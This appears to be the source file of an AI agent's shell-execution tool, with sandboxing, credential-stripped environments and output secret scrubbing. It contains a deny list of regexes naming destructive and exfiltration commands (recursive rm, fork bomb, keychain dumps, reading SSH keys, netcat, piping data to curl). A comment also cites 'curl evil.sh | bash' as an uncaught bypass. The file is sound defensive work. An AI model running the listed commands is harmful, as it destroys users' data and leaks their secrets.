import { sanitizedEnv, scrubSecrets } from "../secrets";
import type { Tool, ToolContext, ToolResult } from "./registry";
import { resolveSandboxMode, wrapWithSandbox } from "./sandbox";

// Tripwire list of obviously destructive commands. This is NOT a security
// boundary: regexes on a shell string are trivially bypassed (quoting tricks
// like `git" "push`, variable indirection, `curl evil.sh | bash`, which this
// list deliberately does NOT try to catch, etc.). Its job is to stop the
// model from stumbling into catastrophic one-liners and to log intent.
// Actual authorization lives in src/policy.ts (deny rules + confirmations)
// and the sanitized env below; OS-level sandboxing is the real fix for
// hostile payloads.
const BLOCKED_HARD: [RegExp, string][] = [
  [/rm\s+(-rf?|--recursive)\s+[/~]/, "recursive rm on root/home"],
  [/rm\s+(-rf?|--recursive)\s+\.\.\/?/, "recursive rm on parent directory"],
  [/>\s*\/dev\/sd/, "write to block device"],
  [/mkfs\./, "format filesystem"],
  [/dd\s+if=/, "raw disk write"],
  [/chmod\s+(-R\s+)?[0-7]*777\s+[/~]/, "chmod 777 on root/home"],
  [/chown\s+-R\s+.*\s+[/~]/, "recursive chown on root/home"],
  [/:\(\)\{\s*:\|:&\s*\};:/, "fork bomb"],
  [/>\s*\/etc\//, "overwrite system config"],
  [/>\s*\/System\//, "overwrite macOS system files"],
  [/launchctl\s+unload/, "unload system services"],
  [
    /systemctl\s+(stop|disable|mask)\s+(sshd|firewalld|ufw)/,
    "disable security services",
  ],
  [/iptables\s+-F/, "flush firewall rules"],
  [/pfctl\s+-d/, "disable macOS firewall"],
  [/sudo\s+visudo/, "edit sudoers"],
  [/passwd/, "change passwords"],
  [/security\s+(delete|remove)-keychain/, "delete keychain"],
  [/security\s+dump-keychain/, "dump keychain"],
  [
    /security\s+find-(generic|internet)-password\s.*-w/,
    "extract keychain passwords",
  ],
  [/cat\s+.*angel\.config/, "read angel config"],
  [/cat\s+.*\/\.env/, "read env file"],
  [/cat\s+.*id_rsa/, "read SSH private key"],
  [/cat\s+.*\.pem/, "read private key"],
  [/cat\s+.*credentials/, "read credentials file"],
  [/printenv|env\s*$|env\s*\|/, "dump all environment variables"],
  [/set\s*$|set\s*\|/, "dump shell variables"],
  [/export\s+-p\s*\|/, "dump exported variables"],
  [
    /curl\s+.*(-d|--data|--data-binary|--upload-file)\s/,
    "curl with outbound data",
  ],
  [/curl\s+.*-X\s*(POST|PUT|PATCH)\s/, "curl with write method"],
  [/wget\s+.*--post/, "wget with POST data"],
  [/nc\s+-/, "netcat"],
  [/ncat\s/, "ncat"],
  [/socat\s/, "socat"],
  [/ssh\s+.*@/, "SSH to remote host"],
  [/scp\s/, "SCP file transfer"],
  [/rsync\s+.*:/, "rsync to remote"],
  [/git\s+push/, "git push"],
  [/git\s+remote\s+add/, "add git remote"],
  [/base64\s+.*\|\s*(curl|wget|nc)/, "encode and exfiltrate"],
  [/\|\s*(curl|wget|nc|ssh)/, "pipe to network tool"],
  [/open\s+.*https?:/, "open URL in browser"],
  [/osascript/, "run AppleScript"],
  [
    /pkill\s+-9\s+(Finder|loginwindow|SystemUIServer|WindowServer)/,
    "kill critical macOS processes",
  ],
  [/kill\s+-9\s+1\b/, "kill init/launchd"],
  [/diskutil\s+(erase|partition|unmount)/, "disk operations"],
  [/hdiutil\s+(eject|detach)/, "disk image operations"],
  [/dscl\s/, "directory service changes"],
  [/defaults\s+write\s+.*LoginwindowText/, "modify login screen"],
  [/crontab\s+-r/, "remove all cron jobs"],
  [/xattr\s+-cr\s+\//, "strip quarantine from root"],
  [/spctl\s+--master-disable/, "disable Gatekeeper"],
];

export const bashTool: Tool = {
  name: "bash",
  description:
    "Execute a shell command. Returns stdout and stderr. Use for system operations, running scripts, git commands, etc. Secrets in output are automatically redacted. NOTE: the blocked-pattern list is a tripwire against obviously destructive commands only — it is NOT a sandbox and can be bypassed (e.g. `curl … | bash` is not blocked). Real authorization comes from the execution-policy engine and confirmations; treat every bash call as running with the user's privileges.",
  parameters: {
    type: "object",
    properties: {
      command: {
        type: "string",
        description: "The shell command to execute",
      },
      timeout_ms: {
        type: "number",
        description: "Timeout in milliseconds (default: 30000, max: 300000)",
      },
    },
    required: ["command"],
  },
  risk: "high",

  async execute(
    input: { command: string; timeout_ms?: number },
    ctx: ToolContext,
  ): Promise<ToolResult> {
    const timeout = Math.min(input.timeout_ms || 30000, 300000);

    for (const [pattern, reason] of BLOCKED_HARD) {
      if (pattern.test(input.command)) {
        return { output: `Blocked: ${reason}`, isError: true };
      }
    }

    try {
      // OS-level sandbox (Seatbelt on macOS). This is the real boundary —
      // BLOCKED_HARD above is only a tripwire. Mode resolves from
      // config.security.sandbox; defaults to filesystem-restricted where
      // the mechanism exists.
      const mode = resolveSandboxMode(ctx.config.security?.sandbox);
      const argv = wrapWithSandbox(input.command, ctx.workingDir, mode);

      const proc = Bun.spawn(argv, {
        cwd: ctx.workingDir,
        stdout: "pipe",
        stderr: "pipe",
        // Credential-bearing variables are stripped; a full env spread would
        // let `echo $ANTHROPIC_API_KEY` leak tokens into LLM context.
        env: { ...sanitizedEnv(), HOME: process.env.HOME || "" },
      });

      const timer = setTimeout(() => proc.kill(), timeout);

      const [stdout, stderr] = await Promise.all([
        new Response(proc.stdout).text(),
        new Response(proc.stderr).text(),
      ]);

      clearTimeout(timer);
      const exitCode = await proc.exited;

      let output = "";
      if (stdout) output += stdout;
      if (stderr) output += (output ? "\n" : "") + `stderr: ${stderr}`;
      if (!output) output = `(exit code: ${exitCode})`;

      output = scrubSecrets(output);

      return {
        output: output.slice(0, 50000),
        isError: exitCode !== 0,
        metadata: { exitCode },
      };
    } catch (err: any) {
      return { output: `Execution error: ${err.message}`, isError: true };
    }
  },
};
